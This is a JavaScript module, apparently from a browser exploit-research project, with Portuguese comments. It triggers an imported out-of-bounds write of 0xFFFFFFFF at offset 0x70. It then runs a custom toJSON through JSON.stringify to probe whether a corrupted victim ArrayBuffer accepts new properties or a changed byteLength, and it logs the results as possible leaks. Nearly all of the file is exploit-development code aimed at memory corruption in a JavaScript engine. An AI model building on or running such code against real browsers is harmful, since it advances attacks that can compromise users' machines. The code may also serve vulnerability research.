// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { executeFocusedTestForTypeError, current_toJSON_call_count_for_TypeError_test } from './testJsonTypeConfusionUAFSpeculative.mjs';
import { OOB_CONFIG } from '../config.mjs'; 
import { toHex } from '../utils.mjs';     

// Nova toJSON para testar escritas em 'this'
function toJSON_TryWriteToThis() {
    // Não usar current_toJSON_call_count_for_TypeError_test++ ou logS3 aqui dentro
    // para evitar o TypeError conhecido por essas operações.
    
    let results = {
        toJSON_executed: "toJSON_TryWriteToThis",
        this_type: "N/A",
        is_victim_ab: false,
        initial_byteLength: "N/A",
        tried_new_prop: false,
        new_prop_value_after_set: "N/A",
        new_prop_error: null,
        tried_set_byteLength: false,
        byteLength_after_set_attempt: "N/A",
        set_byteLength_error: null
    };

    try {
        results.this_type = Object.prototype.toString.call(this);

        if (this instanceof ArrayBuffer) {
            results.is_victim_ab = true; // Assumindo que 'this' será o victim_ab
            results.initial_byteLength = this.byteLength;

            // Teste 1: Tentar definir uma nova propriedade em 'this'
            try {
                results.tried_new_prop = true;
                this.someNewRandomPropertyForTest = 0x12345678;
                if (this.someNewRandomPropertyForTest === 0x12345678) {
                    results.new_prop_value_after_set = "OK (0x12345678)";
                } else {
                    results.new_prop_value_after_set = `Falha na verificação (valor: ${this.someNewRandomPropertyForTest})`;
                }
                // Limpar a propriedade de teste
                delete this.someNewRandomPropertyForTest;
            } catch (e_new_prop) {
                results.new_prop_error = `${e_new_prop.name}: ${e_new_prop.message}`;
            }

            // Teste 2: Tentar modificar this.byteLength (geralmente não configurável)
            // Isso provavelmente causará um erro ou não terá efeito, mas testamos.
            try {
                results.tried_set_byteLength = true;
                // Salvar o descritor original de byteLength, se possível, para restaurar
                // No entanto, modificar byteLength diretamente é geralmente proibido.
                // Esta linha provavelmente lançará um erro ou não fará nada.
                this.byteLength = 128; 
                results.byteLength_after_set_attempt = this.byteLength;
            } catch (e_set_bl) {
                results.set_byteLength_error = `${e_set_bl.name}: ${e_set_bl.message}`;
                // Garantir que o byteLength seja lido novamente se o set falhar
                results.byteLength_after_set_attempt = this.byteLength; 
            }

        } else {
            results.initial_byteLength = "this_is_not_ArrayBuffer";
        }
    } catch (e_outer) {
        results.new_prop_error = results.new_prop_error || `Outer Exception: ${e_outer.name}: ${e_outer.message}`;
        results.set_byteLength_error = results.set_byteLength_error || `Outer Exception: ${e_outer.name}: ${e_outer.message}`;
    }
    
    return results;
}


async function runThisWriteAttemptsTest() {
    const FNAME_RUNNER = "runThisWriteAttemptsTest";
    logS3(`==== INICIANDO Tentativa de Escrita em 'this' via toJSON ====`, 'test', FNAME_RUNNER);

    const valueForCorruption = 0xFFFFFFFF;
    const criticalOffset = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const testDescription = `TryWriteToThis_OOB_${toHex(valueForCorruption)}_at_${toHex(criticalOffset)}`;

    logS3(`\n--- Executando Teste: ${testDescription} ---`, 'subtest', FNAME_RUNNER);
    
    let result = await executeFocusedTestForTypeError(
        testDescription,
        toJSON_TryWriteToThis,
        valueForCorruption,
        criticalOffset
    );

    if (result.errorOccurred) {
        logS3(`   RESULTADO ${testDescription}: ERRO JS CAPTURADO (JSON.stringify): ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "error", FNAME_RUNNER);
        if (result.errorOccurred.stack) logS3(`      Stack: ${result.errorOccurred.stack}`, "error");
    } else if (result.potentiallyCrashed) {
        logS3(`   RESULTADO ${testDescription}: CONGELAMENTO POTENCIAL.`, "error", FNAME_RUNNER);
    } else {
        logS3(`   RESULTADO ${testDescription}: Completou sem erro explícito no JSON.stringify.`, "good", FNAME_RUNNER);
        logS3(`      Stringify Result (conteúdo retornado pela toJSON): ${JSON.stringify(result.stringifyResult)}`, "leak", FNAME_RUNNER);

        // Análise detalhada do objeto retornado pela toJSON
        if (result.stringifyResult && typeof result.stringifyResult === 'object') {
            const sr = result.stringifyResult;
            if (sr.toJSON_executed === "toJSON_TryWriteToThis") {
                logS3(`      toJSON_TryWriteToThis foi executada.`, "info", FNAME_RUNNER);
                logS3(`      Tipo de 'this' na toJSON: ${sr.this_type}`, "info", FNAME_RUNNER);
                logS3(`      'this' é victim_ab?: ${sr.is_victim_ab}`, "info", FNAME_RUNNER);
                logS3(`      ByteLength inicial de 'this': ${sr.initial_byteLength}`, "info", FNAME_RUNNER);
                
                logS3(`      Tentativa de definir nova propriedade: ${sr.tried_new_prop}`, "info", FNAME_RUNNER);
                logS3(`         Valor da nova propriedade após set: ${sr.new_prop_value_after_set}`, sr.new_prop_error ? "warn" : "info", FNAME_RUNNER);
                if (sr.new_prop_error) {
                    logS3(`         Erro ao definir nova propriedade: ${sr.new_prop_error}`, "error", FNAME_RUNNER);
                }

                logS3(`      Tentativa de modificar this.byteLength: ${sr.tried_set_byteLength}`, "info", FNAME_RUNNER);
                logS3(`         this.byteLength após tentativa de set: ${sr.byteLength_after_set_attempt}`, sr.set_byteLength_error ? "warn" : "info", FNAME_RUNNER);
                if (sr.set_byteLength_error) {
                    logS3(`         Erro ao tentar modificar byteLength: ${sr.set_byteLength_error}`, "error", FNAME_RUNNER);
                }
            }
        }
    }
    logS3(`   Título da página ao final de ${testDescription}: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`==== Tentativa de Escrita em 'this' via toJSON CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_TryWriteToThis';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Tentativa de Escrita em 'this' via toJSON Pós-Corrupção ====`,'test', FNAME);
    document.title = "Iniciando Script 3 - Try Write To This";
    
    await runThisWriteAttemptsTest();

    logS3(`\n==== Script 3 CONCLUÍDO (Tentativa de Escrita em 'this') ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;
    
    // Ajuste final do título
    if (document.title.startsWith("Iniciando") || document.title.includes("CONGELOU?")) {
        // Manter
    } else if (document.title.includes("ERRO") || document.title.includes("EXCEPTION")) {
        // Manter título de erro
    } else {
        document.title = "Script 3 Concluído - Try Write To This";
    }
}
